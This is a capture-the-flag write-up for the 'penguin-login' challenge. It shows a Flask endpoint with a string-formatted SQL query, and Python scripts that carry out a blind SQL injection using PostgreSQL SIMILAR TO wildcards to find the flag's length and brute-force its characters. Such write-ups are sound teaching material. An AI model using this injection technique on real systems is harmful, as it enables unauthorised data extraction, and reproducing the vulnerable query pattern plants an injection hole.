penguin-login
> I got tired of people leaking my password from the db so I moved it out of the db. [penguin.chall.lac.tf](penguin.chall.lac.tf)

# Problem
```py
@app.post("/submit")
def submit_form():
    try:
        username = request.form["username"]
        conn = get_database_connection()

        assert all(c in allowed_chars for c in username), "no character for u uwu"
        assert all(
            forbidden not in username.lower() for forbidden in forbidden_strs
        ), "no word for u uwu"

        with conn.cursor() as curr:
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
            result = curr.fetchall()

        if len(result):
            return "We found a penguin!!!!!", 200
        return "No penguins sadg", 201

    except Exception as e:
        return f"Error: {str(e)}", 400

    # need to commit to avoid connection going bad in case of error
    finally:
        conn.commit()
```
In the code, this is the only place we can inject a data

The Goal:
- SQL injection with limited input
  - No substring "like"
  - use allowed char only

## solve
The key for this injection is [SIMILAR TO](https://www.postgresql.org/docs/current/functions-matching.html). It allows us to use wildcard to confirm the length and then guess letter one by one.

As the flag has standard format, the payload I choose is `' OR name SIMILAR TO 'lactf_[???]_`
> `{`, `}` has spacial usage at regex, so replace them with `_` to avoid using escape character.

### Guessing the length
```py
def attempt(username):
    url = "https://penguin.chall.lac.tf/submit"
    form = {"username": username}
    resp = req.post(url, form)
    return resp.status_code, resp.content.decode()

for i in range(20,40):
    payload = f"' OR name SIMILAR TO 'lactf_{'_' * i}_".encode()
    code,content = attempt(payload)
    print(i, code , content)
return
# Output:
# ...
# 35 201 No penguins sadg
# 36 201 No penguins sadg
# 37 201 No penguins sadg
# 38 200 We found a penguin!!!!!
# 39 201 No penguins sadg
```
The output shows the length is 38.

### Guessing letter one by one
```py
def check(guess):
    guess = "".join(guess)
    payload = "' OR name SIMILAR TO 'lactf_"+guess+"_"
    code, content = attempt(payload)
    logging.debug(f"{guess} {code} {content}")
    return code == 200

length = 38
guess = ["_"] * length
allowed_chars.remove("'")
allowed_chars.remove("{")
allowed_chars.remove("}")

for i in tqdm(range(38)):
    for ch in tqdm(allowed_chars):
        guess[i] = ch
        if check(guess):
            break
    logging.info(guess)

# The flag
logging.info(f"lactf{{{''.join(guess)}}}")
```
The flag is printed by the last line.
